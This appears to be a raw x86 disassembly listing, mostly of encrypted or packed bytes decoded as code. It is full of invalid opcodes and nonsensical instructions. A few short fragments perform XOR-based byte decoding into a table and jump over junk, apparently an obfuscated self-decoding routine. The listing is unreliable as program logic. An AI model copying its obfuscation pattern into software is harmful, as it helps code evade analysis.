  412dbb:	(bad)
  412dc0:	xor    DWORD PTR [edi],eax
  412dc2:	mov    ss,WORD PTR [ebp-0x1f4dfd83]
  412dc8:	and    dh,al
  412dca:	mov    eax,0x900a1666
  412dcf:	xor    BYTE PTR [edi+0x53e8e2cc],bh
  412dd5:	retf   0xbeb8
  412dd8:	scas   al,BYTE PTR es:[edi]
  412dd9:	mov    esi,DWORD PTR [esi-0x3f]
  412ddc:	ins    DWORD PTR es:[edi],dx
  412ddd:	aas    
  412dde:	jne    0x412ddd
  412de0:	pop    ebx
  412de1:	ret    
  412de2:	pop    es
  412de3:	cs aad 0xb9
  412de6:	call   DWORD PTR [ecx]
  412de8:	test   BYTE PTR [ebp-0x52],bl
  412deb:	sub    DWORD PTR [eax+0x74],ebp
  412dee:	jb     0x412ddd
  412df0:	clc    
  412df1:	xor    ah,BYTE PTR [edi-0x10fac492]
  412df7:	(bad)  
  412df8:	jno    0x412e41
  412dfa:	popf   
  412dfb:	push   ss
  412dfc:	call   0xa9fbdedc
  412e01:	add    eax,0x26ff14c8
  412e06:	fistp  WORD PTR [ebx-0x79]
  412e09:	push   ss
  412e0a:	xor    al,0x4a
  412e0c:	imul   eax,DWORD PTR [esi+0x1b],0xffffffee
  412e10:	xchg   edi,eax
  412e11:	pop    eax
  412e12:	push   edi
  412e13:	push   eax
  412e14:	sub    ah,ah
  412e16:	pop    edi
  412e17:	pop    esi
  412e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e19:	icebp  
  412e1a:	test   DWORD PTR [edx-0x78],ebx
  412e1d:	xchg   DWORD PTR [ebp+edi*1-0x11],ecx
  412e21:	and    edx,esi
  412e23:	mov    ah,0xbd
  412e25:	fcmovbe st,st(7)
  412e27:	jmp    0xa3ee:0xa30d422d
  412e2e:	mov    esi,DWORD PTR [edx-0xa2df7ba]
  412e34:	push   0x2c8b31c2
  412e39:	dec    edx
  412e3a:	dec    esi
  412e3b:	add    al,0x5a
  412e3d:	stos   BYTE PTR es:[edi],al
  412e3e:	add    ch,BYTE PTR [esi+0x43]
  412e41:	or     BYTE PTR [edi+0x42b7cff6],0x3
  412e48:	mov    eax,0x928d7da0
  412e4d:	pushf  
  412e4e:	or     al,0xe2
  412e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e51:	adc    ch,BYTE PTR [eax+eiz*2-0x5c]
  412e55:	mov    ds:0xba43ae86,eax
  412e5a:	adc    bl,BYTE PTR [ebp-0x7a480a45]
  412e60:	in     eax,0x8f
  412e62:	jecxz  0x412ecf
  412e64:	and    BYTE PTR [esp+eax*1],cl
  412e67:	dec    esp
  412e68:	fwait
  412e69:	pop    ebx
  412e6a:	(bad)  
  412e6b:	mov    DWORD PTR [eax-0x52],edi
  412e6e:	cwde   
  412e6f:	sysret 
  412e71:	lahf   
  412e72:	call   0xe0477c53
  412e77:	mov    cl,BYTE PTR [ebx+0x62]
  412e7a:	in     al,0x35
  412e7c:	dec    ecx
  412e7d:	or     esp,DWORD PTR [ebp+0x61d90867]
  412e83:	shr    BYTE PTR [ebp-0x71],cl
  412e86:	push   DWORD PTR [eax]
  412e88:	cwde   
  412e89:	enter  0x2883,0x7f
  412e8d:	shl    eax,0x19
  412e90:	inc    ecx
  412e91:	pushf  
  412e92:	fidivr DWORD PTR [ebp+0x18]
  412e95:	jmp    0x412e8b
  412e97:	jmp    0x8715a137
  412e9c:	jns    0x412e73
  412e9e:	jo     0x412e7c
  412ea0:	adc    DWORD PTR [ebp+0x22f97c67],ebp
  412ea6:	test   BYTE PTR [eax+0x252fbf6],0x67
  412ead:	imul   ecx,DWORD PTR [edx+0x6590d07c],0xa34aae6f
  412eb7:	enter  0x894,0x61
  412ebb:	xchg   edx,eax
  412ebc:	fdiv   st,st(6)
  412ebe:	icebp  
  412ebf:	pop    ds
  412ec0:	ss mov cl,0x15
  412ec3:	es shl ebp,1
  412ec6:	out    0x4f,al
  412ec8:	retf   
  412ec9:	adc    esp,DWORD PTR [ecx-0x3a11af49]
  412ecf:	adc    DWORD PTR [esi+0x4c],ecx
  412ed2:	jae    0x412ee8
  412ed4:	cmp    cl,al
  412ed6:	push   ebx
  412ed7:	push   ebp
  412ed8:	ds call 0x9962479f
  412ede:	das    
  412edf:	jle    0x412eb1
  412ee1:	pushf  
  412ee2:	xchg   ebp,eax
  412ee3:	shr    DWORD PTR [ecx],cl
  412ee5:	push   ds
  412ee6:	sub    edx,esi
  412ee8:	pop    es
  412ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eea:	fs (bad) 
  412eec:	adc    al,0xd8
  412eee:	(bad)  
  412eef:	leave  
  412ef0:	out    0x23,eax
  412ef2:	pop    ebp
  412ef3:	inc    ebx
  412ef4:	mov    ecx,0x83e37fd8
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x2e
  412f26:	mov    al,0xe9
  412f28:	jecxz  0x412f93
  412f2a:	jne    0x412fa4
  412f2c:	js     0x412f13
  412f2e:	jle    0x412fa8
  412f30:	js     0x412fae
  412f32:	and    al,0x65
  412f34:	aaa    
  412f35:	cmp    eax,esp
  412f37:	in     eax,0x44
  412f39:	(bad)  
  412f3a:	lock lahf 
  412f3c:	mov    ds:0xc1d59500,al
  412f41:	adc    al,0xa9
  412f43:	loope  0x412ed0
  412f45:	or     DWORD PTR [edx],esi
  412f47:	mov    al,0xe1
  412f49:	scas   eax,DWORD PTR es:[edi]
  412f4a:	nop
  412f4b:	gs aam 0x8a
  412f4e:	out    0xea,al
  412f50:	les    edi,FWORD PTR [ecx-0x59e52573]
  412f56:	adc    DWORD PTR [edx-0x59417bb3],0xffffffb3
  412f5d:	xchg   esi,eax
  412f5e:	and    edi,DWORD PTR [ebx]
  412f60:	pusha  
  412f61:	or     ch,al
  412f63:	sub    eax,0xd3c18d11
  412f68:	retf   
  412f69:	push   eax
  412f6a:	and    al,0x8b
  412f6c:	push   ebp
  412f6d:	cmp    al,bh
  412f6f:	setb   BYTE PTR [edx*2+0x2bb60a9f]
  412f77:	mov    ebp,0xeda0a6ba
  412f7c:	cdq    
  412f7d:	les    ecx,FWORD PTR [edi]
  412f7f:	cmc    
  412f80:	bound  ebp,QWORD PTR [ebx-0x17f9aaff]
  412f86:	retf   
  412f87:	xchg   ebx,eax
  412f88:	push   ebp
  412f89:	arpl   WORD PTR [ebx+0x45],di
  412f8c:	sbb    eax,0xeadb2d75
  412f91:	mov    al,0x35
  412f93:	dec    ebx
  412f94:	sub    DWORD PTR ds:0x93b10a70,0x264a7041
  412f9e:	outs   dx,BYTE PTR ds:[esi]
  412f9f:	rcr    BYTE PTR [eax+0x1d],cl
  412fa2:	fisttp WORD PTR [ebx]
  412fa4:	xchg   ebp,eax
  412fa5:	sub    al,0x24
  412fa7:	mov    esi,0x9bf8d308
  412fac:	mov    dl,BYTE PTR [edx-0x7feaa923]
  412fb2:	loop   0x412fbd
  412fb4:	lock and eax,DWORD PTR [edi+ecx*4]
  412fb8:	repnz stos BYTE PTR es:[edi],al
  412fba:	gs jae 0x412fd7
  412fbd:	js     0x413027
  412fbf:	mov    edi,DWORD PTR [edx]
  412fc1:	int    0x85
  412fc3:	add    eax,0xc51b0c22
  412fc8:	cmp    eax,0xbed33433
  412fcd:	pop    ebp
  412fce:	(bad)  
  412fcf:	sti    
  412fd0:	mov    esi,0x494fa99
  412fd5:	dec    esi
  412fd6:	dec    esp
  412fd7:	adc    al,BYTE PTR [eax]
  412fd9:	leave  
  412fda:	xchg   ebp,eax
  412fdb:	jg     0x413002
  412fdd:	int3   
  412fde:	test   al,0x87
  412fe0:	sar    BYTE PTR [eax+ebp*8+0x5b970993],1
  412fe7:	xchg   BYTE PTR [esi+eax*8+0x167f7723],ch
  412fee:	icebp  
  412fef:	mov    ds,edi
  412ff1:	cs out dx,al
  412ff3:	cmp    BYTE PTR [eax-0x4fda7f26],cl
  412ff9:	inc    ebx
  412ffa:	adc    eax,0x207df2b6
  412fff:	push   edi
  413000:	out    dx,eax
  413001:	scas   al,BYTE PTR es:[edi]
  413002:	je     0x413071
  413004:	jle    0x412fbc
  413006:	gs into 
  413008:	mov    dh,bl
  41300a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300b:	xlat   BYTE PTR ds:[ebx]
  41300c:	xchg   ebp,eax
  41300d:	adc    al,0x85
  41300f:	xchg   esp,eax
  413010:	(bad)  
  413011:	push   eax
  413012:	fmul   st(5),st
  413014:	inc    edi
  413015:	add    ah,BYTE PTR [edx+eax*2+0x65]
  413019:	dec    ebp
  41301a:	xor    edx,DWORD PTR [ebp+0x76]
  41301d:	sbb    eax,0x58564903
  413022:	push   eax
  413023:	adc    al,0x88
  413025:	dec    edx
  413026:	mov    bh,0x95
  413028:	add    al,0x46
  41302a:	inc    edi
  41302b:	pop    ecx
  41302c:	leave  
  41302d:	adc    ebp,DWORD PTR [ebx+eiz*1-0x713bc191]
  413034:	mov    ds:0x69f133a6,eax
  413039:	aad    0xf4
  41303b:	add    edi,DWORD PTR [ecx]
  41303d:	jmp    0x6f72:0xc22fcc37
  413044:	test   al,0x77
  413046:	ret    0xb5fa
  413049:	pop    esi
  41304a:	nop
  41304b:	in     eax,dx
  41304c:	fcmovbe st,st(7)
  41304e:	pop    ds
  41304f:	jne    0x413065
  413051:	xchg   BYTE PTR [esi+ecx*1+0x32],al
  413055:	jp     0x413083
  413057:	fbstp  TBYTE PTR [esi-0x1b]
  41305a:	aas    
  41305b:	scas   eax,DWORD PTR es:[edi]
  41305c:	test   al,0xe0
  41305e:	push   esi
  41305f:	or     bl,ah
  413061:	adc    ecx,ebp
  413063:	xchg   dl,dh
  413065:	shl    ah,0x2a
  413068:	jo     0x413086
  41306a:	test   DWORD PTR [edi],edx
  41306c:	cdq    
  41306d:	in     eax,0xf8
  41306f:	pusha  
  413070:	push   ds
  413071:	inc    ebp
  413072:	push   0x3b
  413074:	arpl   WORD PTR [esi-0x25e28660],cx
  41307a:	enter  0x7107,0xdf
  41307e:	ss mov al,0x4c
  413081:	jge    0x41303a
  413083:	dec    ebx
  413084:	cmc    
  413085:	ror    DWORD PTR [ecx],cl
  413087:	inc    eax
  413088:	add    al,0xfb
  41308a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41308b:	dec    eax
  41308c:	sub    al,0xc1
  41308e:	pop    ebp
  41308f:	jb     0x41310a
  413091:	bound  ecx,QWORD PTR [edi+eax*1]
  413094:	(bad)  
  413095:	loopne 0x413101
  413097:	jmp    0x220d63fc
  41309c:	sbb    dh,BYTE PTR [ebp-0x17]
  41309f:	dec    edx
  4130a0:	xor    eax,0x58fe9125
  4130a5:	and    BYTE PTR [ecx],dh
  4130a7:	mov    dl,0xe7
  4130a9:	sbb    DWORD PTR [eax-0x2ee6f66d],esp
  4130af:	in     al,dx
  4130b0:	xor    BYTE PTR [eax-0x37ff7086],dh
  4130b6:	aas    
  4130b7:	fst    DWORD PTR [ebp-0x73]
  4130ba:	sbb    DWORD PTR [edi+0x40],edi
  4130bd:	dec    ecx
  4130be:	aas    
  4130bf:	(bad)  [esi-0x2]
  4130c2:	xchg   edx,eax
  4130c3:	sbb    edi,edi
  4130c5:	or     esp,DWORD PTR [ecx-0x79]
  4130c8:	out    0x68,al
  4130ca:	sub    DWORD PTR [ebx-0x4a],ebp
  4130cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ce:	fsubp  st(0),st
  4130d0:	iret   
  4130d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d2:	mov    edx,0x66a2e4ef
  4130d7:	cli    
  4130d8:	or     BYTE PTR [esi+ecx*2],ah
  4130db:	ret    
  4130dc:	ins    DWORD PTR es:[edi],dx
  4130dd:	xor    eax,0x248c6fd4
  4130e2:	pop    edx
  4130e3:	pop    edi
  4130e4:	hlt    
  4130e5:	dec    esp
  4130e6:	in     al,0xb1
  4130e8:	and    al,0x40
  4130ea:	shr    BYTE PTR [edx-0x1a],0xfb
  4130ee:	inc    esp
  4130ef:	xor    ch,BYTE PTR [eax-0x7f]
  4130f2:	dec    ebx
  4130f3:	gs cmc 
  4130f5:	xchg   esp,eax
  4130f6:	ficom  DWORD PTR [eax]
  4130f8:	(bad)  
  4130f9:	mov    eax,ds:0xdf26d14d
  4130fe:	test   DWORD PTR [ebx+0x67631f9c],eax
  413104:	lock jecxz 0x4130af
  413107:	out    0xc1,al
  413109:	xor    al,0x4e
  41310b:	lock aaa 
  41310d:	aaa    
  41310e:	xchg   BYTE PTR [esi-0x19],al
  413111:	and    ah,BYTE PTR [ebp+esi*1+0x1d570d82]
  413118:	scas   eax,DWORD PTR es:[edi]
  413119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311a:	stos   DWORD PTR es:[edi],eax
  41311b:	push   edi
  41311c:	nop
  41311d:	pop    ebx
  41311e:	repz pop ebp
  413120:	pop    edx
  413121:	sbb    ebx,DWORD PTR [bp+di-0x2e]
  413125:	push   ebp
  413126:	loope  0x41317b
  413128:	aad    0xd8
  41312a:	push   esp
  41312b:	fstp   TBYTE PTR [edi-0x3a]
  41312e:	xor    DWORD PTR [ecx+0x5d],esi
  413131:	int3   
  413132:	mov    ebx,0x905fb6e1
  413137:	pop    edx
  413138:	jecxz  0x4131af
  41313a:	(bad)  
  41313b:	aam    0x7b
  41313d:	jl     0x41314a
  41313f:	add    BYTE PTR [edx+0x15],ch
  413142:	test   eax,0xad5c441f
  413147:	mov    dh,0xe5
  413149:	std    
  41314a:	xchg   edx,eax
  41314b:	xor    al,0xa2
  41314d:	pop    es
  41314e:	lock rcl ecx,0xc3
  413152:	sbb    bh,cl
  413154:	(bad)  [eax-0x3f818727]
  41315a:	or     dl,ch
  41315c:	cmp    edx,DWORD PTR [eax]
  41315e:	cld    
  41315f:	es sahf 
  413161:	xchg   BYTE PTR [edx-0x1bf7cf58],ah
  413167:	or     eax,0x5d2baf42
  41316c:	push   ecx
  41316d:	xor    al,0xa5
  41316f:	clc    
  413170:	add    BYTE PTR [edi],ah
  413172:	gs je  0x413168
  413175:	aad    0xd8
  413177:	hlt    
  413178:	pop    es
  413179:	push   edi
  41317a:	adc    ebp,DWORD PTR [ecx-0x394d301d]
  413180:	fcom   DWORD PTR [ebp-0x46]
  413183:	jne    0x413148
  413185:	cmp    DWORD PTR [ebx],ebx
  413187:	pop    edi
  413188:	in     eax,dx
  413189:	push   es
  41318a:	pop    edx
  41318b:	xor    BYTE PTR [edi],bl
  41318d:	dec    ebp
  41318e:	arpl   WORD PTR ss:[eax],bx
  413191:	fwait
  413192:	mov    eax,ds:0x26ecd32a
  413197:	jbe    0x4131c6
  413199:	mov    al,ds:0x7d8bb207
  41319e:	hlt    
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	in     eax,dx
  4131c8:	jns    0x4131a9
  4131ca:	rcl    esi,0x7a
  4131cd:	js     0x413247
  4131cf:	in     eax,0x7e
  4131d1:	js     0x41324b
  4131d3:	mov    eax,ds:0x1abb0187
  4131d8:	push   ebx
  4131d9:	in     al,0x67
  4131db:	inc    eax
  4131dc:	push   edx
  4131dd:	mov    eax,0xd04af665
  4131e2:	stc    
  4131e3:	cs test bh,ch
  4131e6:	mov    esp,0xf540e3dd
  4131eb:	inc    edx
  4131ec:	xchg   ecx,eax
  4131ed:	sbb    eax,0xa6dfe957
  4131f2:	mov    dl,0xf8
  4131f4:	xchg   BYTE PTR [ebx],dl
  4131f6:	aaa    
  4131f7:	xor    edi,DWORD PTR [esi-0x8006c1d]
  4131fd:	sbb    dh,dh
  4131ff:	mov    eax,0x49642866
  413204:	adc    BYTE PTR [ecx+0x4],cl
  413207:	inc    edi
  413208:	sti    
  413209:	xchg   BYTE PTR [edi+0x484f1b87],dl
  41320f:	into   
  413210:	fimul  DWORD PTR [esi]
  413212:	repz scas eax,DWORD PTR es:[edi]
  413214:	fldcw  WORD PTR [edi]
  413216:	lahf   
  413217:	aaa    
  413218:	cmp    ebp,DWORD PTR [ebp+0x6f8fdb9e]
  41321e:	pop    ds
  41321f:	cmp    BYTE PTR [ecx+0x9],0x55
  413223:	jp     0x413205
  413225:	sbb    ebx,DWORD PTR [ecx+0x2e199ed3]
  41322b:	inc    esi
  41322c:	mov    gs,ecx
  41322e:	cmp    dh,BYTE PTR [edi]
  413230:	in     al,0x9a
  413232:	mov    WORD PTR [ecx+0x7f],cs
  413235:	push   ebp
  413236:	(bad)  [eax-0x5d]
  413239:	adc    al,0x5
  41323b:	push   edi
  41323c:	xchg   edi,eax
  41323d:	ins    DWORD PTR es:[edi],dx
  41323e:	add    bl,BYTE PTR [edx-0x77]
  413241:	std    
  413242:	or     ch,BYTE PTR [esp+ebp*1]
  413245:	cmp    BYTE PTR [esi+ebx*8-0x5adf6c23],0x60
  41324d:	mov    ds:0x4ac78988,al
  413252:	ja     0x41323b
  413254:	repnz clc 
  413256:	(bad)  
  413257:	mov    ch,0x6e
  413259:	jnp    0x4131f5
  41325b:	test   DWORD PTR [eax-0x46],edi
  41325e:	cld    
  41325f:	and    DWORD PTR [edx+0x2e557819],edi
  413265:	into   
  413266:	stos   DWORD PTR es:[edi],eax
  413267:	pop    edx
  413268:	cmp    esp,DWORD PTR [ebx+0x28]
  41326b:	test   DWORD PTR [eax-0x6b689a06],ebp
  413271:	xchg   esi,eax
  413272:	xor    bl,BYTE PTR [ebx]
  413274:	cdq    
  413275:	adc    esi,DWORD PTR [ebx]
  413277:	ins    DWORD PTR es:[edi],dx
  413278:	sti    
  413279:	(bad)  
  41327a:	jp     0x413277
  41327c:	add    DWORD PTR [ebp+0x11],0x4
  413280:	xlat   BYTE PTR ds:[ebx]
  413281:	mov    esp,0xd76ca360
  413286:	adc    eax,0xc74b48a2
  41328b:	push   0x9e60ac98
  413290:	outs   dx,DWORD PTR ds:[esi]
  413291:	inc    edx
  413292:	(bad)  
  413293:	loope  0x4132e7
  413295:	das    
  413296:	bound  ebx,QWORD PTR [edi]
  413298:	push   ebp
  413299:	jnp    0x41321f
  41329b:	outs   dx,BYTE PTR ds:[esi]
  41329c:	inc    edi
  41329d:	fdiv   st,st(2)
  41329f:	fisttp WORD PTR [edx+ecx*4+0x5b]
  4132a3:	dec    esp
  4132a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132a5:	jo     0x4132f5
  4132a7:	ss pop ecx
  4132a9:	xchg   esp,eax
  4132aa:	push   edx
  4132ab:	stos   BYTE PTR es:[edi],al
  4132ac:	push   0x6d
  4132ae:	or     eax,DWORD PTR [ebx+0x14]
  4132b1:	outs   dx,BYTE PTR ds:[esi]
  4132b2:	xchg   BYTE PTR [eax+edx*2-0x5cb04b50],dl
  4132b9:	les    ecx,FWORD PTR [ebx+0x78]
  4132bc:	scas   eax,DWORD PTR es:[edi]
  4132bd:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132bf:	loop   0x41328d
  4132c1:	into   
  4132c2:	fucom  st(5)
  4132c4:	stos   DWORD PTR es:[edi],eax
  4132c5:	cmp    DWORD PTR [eax+0xd],0xffffffb8
  4132c9:	jae    0x413343
  4132cb:	test   al,0xb1
  4132cd:	mov    esp,0x69632f5f
  4132d2:	sub    ah,dl
  4132d4:	add    DWORD PTR [edx-0x1b],edx
  4132d7:	fwait
  4132d8:	shl    DWORD PTR [edx],1
  4132da:	xor    ebx,DWORD PTR [ebp-0x140442a8]
  4132e0:	hlt    
  4132e1:	cdq    
  4132e2:	push   edi
  4132e3:	and    BYTE PTR [esi-0x84da32a],dl
  4132e9:	inc    ebx
  4132ea:	int    0x32
  4132ec:	popa   
  4132ed:	mov    ds:0x71334bbf,eax
  4132f2:	ins    DWORD PTR es:[edi],dx
  4132f3:	pop    eax
  4132f4:	retf   
  4132f5:	adc    edi,DWORD PTR [esi+0x29229adf]
  4132fb:	sub    al,dh
  4132fd:	in     al,0x8b
  4132ff:	(bad)  
  413300:	js     0x413345
  413302:	mov    ecx,0x6a19b751
  413307:	jnp    0x41331d
  413309:	mov    cs,WORD PTR [edx+0x14f4fb3a]
  41330f:	cmp    eax,0xf607f27f
  413314:	xchg   ebp,eax
  413315:	xchg   BYTE PTR [ecx+edi*4],bl
  413318:	iret   
  413319:	fcmovnu st,st(0)
  41331b:	adc    DWORD PTR [esp+ebp*1],0xa89dd947
  413322:	mov    edx,edi
  413324:	(bad)  
  413325:	push   ds
  413326:	retf   0x340c
  413329:	scas   al,BYTE PTR es:[edi]
  41332a:	into   
  41332b:	xchg   ecx,eax
  41332c:	in     al,0x7a
  41332e:	push   esi
  41332f:	out    dx,eax
  413330:	xor    BYTE PTR [edi],0xa3
  413333:	aad    0xca
  413335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413336:	add    BYTE PTR [eax+0x4b],ch
  413339:	dec    ecx
  41333a:	(bad)  
  41333b:	adc    al,0xc4
  41333d:	mov    bh,0x53
  41333f:	push   ecx
  413340:	jle    0x4132eb
  413342:	xchg   esp,eax
  413343:	jg     0x413354
  413345:	pop    ecx
  413346:	pop    ebp
  413347:	fnstcw WORD PTR [eax]
  413349:	fs xchg edi,eax
  41334b:	out    dx,eax
  41334c:	es xchg ah,ah
  41334f:	adc    edx,edx
  413351:	xchg   esi,eax
  413352:	pop    ss
  413353:	ror    BYTE PTR [edi+0x25],0xde
  413357:	jne    0x4133ab
  413359:	mov    cl,0x41
  41335b:	mov    ch,0x1e
  41335d:	repz mov bl,0xfb
  413360:	rcl    DWORD PTR [ecx-0x2b],1
  413363:	aad    0x99
  413365:	and    al,0x24
  413367:	int3   
  413368:	sbb    eax,0x669bc1c
  41336d:	in     al,0xb5
  41336f:	mov    bh,0x60
  413371:	lea    ebx,[esi+0x535c481f]
  413377:	iret   
  413378:	mov    DWORD PTR [edx-0x78],ecx
  41337b:	clc    
  41337c:	inc    eax
  41337d:	jnp    0x413363
  41337f:	pop    ecx
  413380:	add    bh,BYTE PTR [ebx]
  413382:	jge    0x413359
  413384:	mov    ch,0x1f
  413386:	push   ebx
  413387:	dec    ebx
  413388:	aaa    
  413389:	outs   dx,DWORD PTR ds:[esi]
  41338a:	push   ebp
  41338b:	scas   eax,DWORD PTR es:[edi]
  41338c:	inc    ecx
  41338d:	adc    eax,0x2a25069c
  413392:	out    0x7e,al
  413394:	stos   DWORD PTR es:[edi],eax
  413395:	mov    bl,0xbc
  413397:	fistp  DWORD PTR [esi+0x21]
  41339a:	and    esi,DWORD PTR ds:0xfaa6ed03
  4133a0:	shr    DWORD PTR [edi],0xcb
  4133a3:	in     eax,0x72
  4133a5:	or     DWORD PTR [ecx+0x2b],0x3
  4133a9:	xlat   BYTE PTR ds:[ebx]
  4133aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ab:	je     0x4133b4
  4133ad:	fisub  WORD PTR [edx]
  4133af:	jo     0x413365
  4133b1:	hlt    
  4133b2:	fstp   TBYTE PTR [ebx-0x2da05e7a]
  4133b8:	push   esi
  4133b9:	and    BYTE PTR [ebx+0x5e],ah
  4133bc:	push   ax
  4133be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133bf:	std    
  4133c0:	std    
  4133c1:	add    esp,DWORD PTR [eax+eiz*8]
  4133c4:	pushf  
  4133c5:	cwde   
  4133c6:	push   cs
  4133c7:	pop    ss
  4133c8:	rcl    edi,1
  4133ca:	jb     0x4133cd
  4133cc:	in     al,dx
  4133cd:	pop    ebx
  4133ce:	cmp    DWORD PTR [edi+ebx*8],ecx
  4133d1:	jb     0x41338c
  4133d3:	in     eax,0x9a
  4133d5:	fs mov esi,0x59ae5f7e
  4133db:	ret    0x1d73
  4133de:	icebp  
  4133df:	int    0x7f
  4133e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133e2:	add    edx,DWORD PTR [ebx-0x70]
  4133e5:	adc    dl,BYTE PTR [eax-0x16a27e25]
  4133eb:	and    BYTE PTR [ecx-0x760c4883],0x6d
  4133f2:	or     al,ah
  4133f4:	and    al,0xa0
  4133f6:	scas   eax,DWORD PTR es:[edi]
  4133f7:	push   esi
  4133f8:	and    al,0xb5
  4133fa:	stc    
  4133fb:	push   edx
  4133fc:	add    ebx,DWORD PTR [esi+0x7d]
  4133ff:	or     al,0x33
  413401:	lahf   
  413402:	push   esp
  413403:	dec    edi
  413404:	addr16 jo 0x413419
  413407:	unpcklps xmm0,XMMWORD PTR [edi+0x3d21235b]
  41340e:	cli    
  41340f:	idiv   BYTE PTR [edx-0x7257d15f]
  413415:	rol    DWORD PTR [edx],1
  413417:	repnz pop edi
  413419:	loop   0x413484
  41341b:	sbb    DWORD PTR [ebx+0x43680e6a],esp
  413421:	adc    BYTE PTR [ebx-0xd],bl
  413424:	scas   al,BYTE PTR es:[edi]
  413425:	fnstcw WORD PTR [eax-0x17]
  413428:	mov    ch,0x58
  41342a:	xlat   BYTE PTR ds:[ebx]
  41342b:	and    BYTE PTR [edi+0x2b],ah
  41342e:	ror    DWORD PTR [ecx-0x67],0x5c
  413432:	mov    ebx,0xd1aa30c
  413437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413438:	ret    0x2522
  41343b:	xchg   ebx,eax
  41343c:	ret    0x3fd
  41343f:	jge    0x41342d
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x5e5bcb5e
  41345f:	mov    esi,0x787f7843
  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	aad    0xb3
  41346a:	js     0x413498
  41346c:	or     DWORD PTR [ecx+0x41],esi
  41346f:	xor    BYTE PTR [eax],0x6e
  413472:	pop    ebx
  413473:	movq   QWORD PTR [ecx],mm7
  413476:	cdq    
  413477:	add    al,ch
  413479:	ror    DWORD PTR [ecx+0x71],cl
  41347c:	mov    bl,0x42
  41347e:	mov    cl,dl
  413480:	loopne 0x41340a
  413482:	mov    edi,0x9e1c87b5
  413487:	out    dx,al
  413488:	inc    ebx
  413489:	push   ss
  41348a:	and    BYTE PTR [edx],bh
  41348c:	dec    esp
  41348d:	mov    ecx,DWORD PTR [ecx]
  41348f:	retf   0x3f4d
  413492:	push   0x36
  413494:	pop    ds
  413495:	pop    es
  413496:	cmp    DWORD PTR [esi-0xb59c884],ecx
  41349c:	cmc    
  41349d:	add    cl,cl
  41349f:	cmp    eax,0x29c5fc11
  4134a4:	xchg   esp,eax
  4134a5:	pop    eax
  4134a6:	addr16 fs inc ecx
  4134a9:	loop   0x4134e1
  4134ab:	push   ebp
  4134ac:	(bad)  
  4134ad:	push   eax
  4134ae:	aam    0x7f
  4134b0:	gs ins BYTE PTR es:[edi],dx
  4134b2:	daa    
  4134b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134b4:	dec    eax
  4134b5:	sbb    DWORD PTR [ecx],0x2f6fdbd2
  4134bb:	push   eax
  4134bc:	ret    
  4134bd:	out    0x9a,eax
  4134bf:	(bad)  
  4134c0:	out    0xf8,eax
  4134c2:	fbld   TBYTE PTR [ecx]
  4134c4:	xchg   edx,eax
  4134c5:	xchg   ebx,eax
  4134c6:	test   DWORD PTR [edx+0x5521f2e6],0xa94d4299
  4134d0:	arpl   WORD PTR [ecx+0x28],cx
  4134d3:	retf   
  4134d4:	cmp    DWORD PTR [ebp-0x6b0f8522],0x25b7614e
  4134de:	fist   WORD PTR [edx-0x19]
  4134e1:	dec    ebx
  4134e2:	repnz fadd st(7),st
  4134e5:	aaa    
  4134e6:	add    eax,0x346b645b
  4134eb:	push   edx
  4134ec:	inc    esp
  4134ed:	and    eax,0x8cb30163
  4134f2:	ja     0x413531
  4134f4:	imul   esi,DWORD PTR [edi],0x71
  4134f7:	dec    eax
  4134f8:	sub    dh,dl
  4134fa:	jno    0x4134c1
  4134fc:	imul   esi,DWORD PTR ds:0xf1167836,0x43
  413503:	in     al,0xc
  413505:	lahf   
  413506:	dec    ebx
  413507:	in     eax,0x3a
  413509:	out    0x21,al
  41350b:	jne    0x4134c5
  41350d:	adc    ecx,edi
  41350f:	out    dx,al
  413510:	ret    0x6c59
  413513:	jl     0x413571
  413515:	pop    edi
  413516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413517:	mov    ah,0xab
  41351a:	lds    eax,FWORD PTR [ebx-0x41]
  41351d:	dec    eax
  41351e:	push   ebp
  41351f:	out    dx,eax
  413520:	and    edi,DWORD PTR [edi-0x63f1e29f]
  413526:	and    bl,BYTE PTR [ecx-0x6]
